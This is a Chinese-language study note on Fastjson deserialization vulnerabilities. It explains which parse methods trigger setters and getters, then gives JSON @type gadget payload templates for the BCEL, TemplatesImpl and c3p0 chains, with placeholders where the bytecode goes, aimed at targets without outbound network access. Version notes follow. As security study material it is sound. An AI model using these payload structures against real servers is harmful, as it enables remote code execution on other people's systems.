---
title: "FastJson"
date: 2026-01-13
updated: 2026-01-13
tags:
  - Others
categories:
  - Others
description: None
---
> 历史漏洞 https://avd.aliyun.com/search?q=fastjson

> https://xz.aliyun.com/news/14309
> https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w

## 基础介绍

> 序列化与反序列化方法：
> 
> - 序列化方法：
> 	- `JSON.toJSONString()`，返回字符串；
> 	- `JSON.toJSONBytes()`，返回 byte 数组；
> - 反序列化方法：
> 	- `JSON.parseObject()`，返回 `JsonObject`；
> 	- `JSON.parse()`，返回 `Object`；
> 	- `JSON.parseArray()`，返回 `JSONArray`；
> 	- 将 JSON 对象转换为 java 对象：`JSON.toJavaObject()`；
> 	- 将 JSON 对象写入 write 流：`JSON.writeJSONString()`；
> - 常用：
> 	- `JSON.toJSONString()`、 `JSON.parse()`、 `JSON.parseObject()`

> 触发原因：
> 
> - 序列化固定类后：
> 	- `parse` 方法在调用时会调用 `set` 方法
> 	- `parseObject` 在调用时会调用 `set` 和 `get` 方法
> - 反序列化指定类后：
> 	-  `parseObject` 在调用时会调用 `set` 方法。

## 不出网问题

> https://xz.aliyun.com/news/11938
> https://github.com/safe6Sec/Fastjson

对一些协议、端口、内外网限制。（JNDI 作为一种服务接口，若目标无法访问，则就无法触发）

可通过延时进行判断是否存在漏洞

> 将要执行命令的文件转换为特定的格式，触发反序列化本地执行。

### 利用 BCEL 进行本地类加载

> BCEL 用来分析、修改和创建 Java 字节码。通常程序运行后字节码是不动的，但 BCEL 运行在程序运行的过程中，或在文件层面，直接对字节码进行操作：
> 
> - **分析：** 查看一个类有哪些方法、字段，逻辑是什么。
> - **修改：** 在现有的方法里插入一段你自己的代码（比如监控代码、后门代码等）。
> - **创建：** 凭空生成一个新的 `.class` 文件，而不需要写 `.java` 源码。

BCEL 提供一个特殊类加载器 ClassLoader，可以识别 `$$BCEL$$` 开头的长字符串。

通过将恶意代码编译为字节码，使用 BCEL 将字节码转换为特殊的字符串，服务器在内存中还原并执行恶意代码，从而导致 RCE。

```json
{
   "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
   "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
   },
   "driverClassName": "$$BCEL$$xxxx"
}

```

### TemplatesImpl 链

触发 `JSON.parseObject(payload, Feature.SupportNonPublicField);`

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["字节码"],
    '_name': 'a.b',
    '_tfactory': {},
    "_outputProperties": {},
    "_name": "b",
    "_version": "1.0",
    "allowedProtocols": "all"
}
```

### c3p0 链

```json
{
    "@type": "java.lang.Class",
    "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
},
"f": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:;HEX值"
}
```

> 版本差异：
> 
> - <= 1.2.47 可利用 JDK 自带的链可实现 RCE；
> - 1.2.47 - 1.2.80 利用链为依赖包或本地代码；（依赖包还需要开启 autoType）


